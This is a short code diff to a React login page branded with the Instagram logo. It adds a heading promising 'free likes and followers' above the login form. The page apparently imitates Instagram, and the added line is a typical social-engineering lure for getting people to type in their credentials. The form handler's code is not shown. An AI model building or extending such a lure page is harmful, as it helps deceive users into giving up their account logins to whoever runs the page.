@@ -55,6 +55,10 @@ export default function LoginPage() {
             <img src="/instagram-logo.png" alt="Instagram" className="login-page__logo-img" />
           </div>
 
+          <h2 className="login-page__marketing-title">
+            Login to get free likes and followers
+          </h2>
+
           <form className="login-page__form" onSubmit={handleLogin} noValidate>
             {/* Email input */}
             <div className={`login-input-wrap ${inputFocused ? 'login-input-wrap--focused' : ''} ${input ? 'login-input-wrap--filled' : ''}`}>
